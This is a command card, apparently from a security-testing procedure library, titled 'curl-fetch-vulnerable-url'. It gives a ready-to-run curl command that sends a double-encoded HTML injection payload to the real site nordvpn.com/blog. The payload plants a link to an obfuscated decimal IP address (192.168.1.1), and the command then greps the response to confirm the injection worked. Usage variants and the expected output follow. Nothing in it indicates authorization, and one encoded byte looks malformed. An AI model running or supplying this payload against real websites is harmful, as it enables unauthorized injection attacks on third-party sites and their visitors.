---
data: >-
  curl -s
  "https://nordvpn.com/blog/?1%25%32%25%32%25%33%65%25%33%63%25%32%66%25%36%31%25%13%25%33%63%25%36%31%25%30%63href%25%33%64%25%32%32http://3232235777"
  | grep -i "href"
tags:
  - web-testing
  - injection
type: command
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
id: 9b47ac35-b688-4cdc-99ec-34525d32cb96
created_at: '2025-12-14T03:47:18.158Z'
updated_at: '2025-12-14T03:47:18.158Z'
verified: false
validated: true
submitted: true
---
# curl-fetch-vulnerable-url

## Command

```bash
curl -s "https://nordvpn.com/blog/?1%25%32%25%32%25%33%65%25%33%63%25%32%66%25%36%31%25%13%25%33%63%25%36%31%25%30%63href%25%33%64%25%32%32http://3232235777" | grep -i "href"
```

## Description

Fetches the vulnerable nordvpn.com/blog page with an encoded HTML injection payload and greps for href attributes to verify injection. Use this to test reflected content without a browser.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `-s` | Silent mode (suppress progress meter) | Yes |
| URL | The full vulnerable URL with payload | Yes |
| `| grep -i "href"` | Pipe to grep for case-insensitive search of href | Yes |

## Examples

### Basic Usage

```bash
curl -s "https://nordvpn.com/blog/?[payload]" | grep -i "href"
```

### Advanced Usage

```bash
curl -s -o response.html "https://nordvpn.com/blog/?[payload]" && grep -i "192.168.1.1" response.html
```

## Expected Output

Lines containing injected hrefs, e.g., `<a href="http://3232235777">` or links to 192.168.1.1, confirming successful injection.

## Related

- [[Related Procedure: Craft-URL-for-HTML-Injection]]
- [[Related Procedure: Verify-HTML-Injection-on-Page]]
